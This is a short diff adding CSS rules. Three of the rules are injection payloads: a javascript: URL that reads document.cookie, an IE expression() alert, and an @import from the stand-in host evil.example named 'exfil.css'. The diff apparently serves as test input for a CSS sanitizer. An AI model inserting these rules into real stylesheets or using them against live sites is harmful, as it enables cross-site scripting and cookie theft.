@@ -1,0 +1,4 @@
+body { background: url("javascript:alert(document.cookie)"); }
+.legacy { width: expression(alert('xss')); }
+@import url("http://evil.example/exfil.css");
+p { color: #000; }
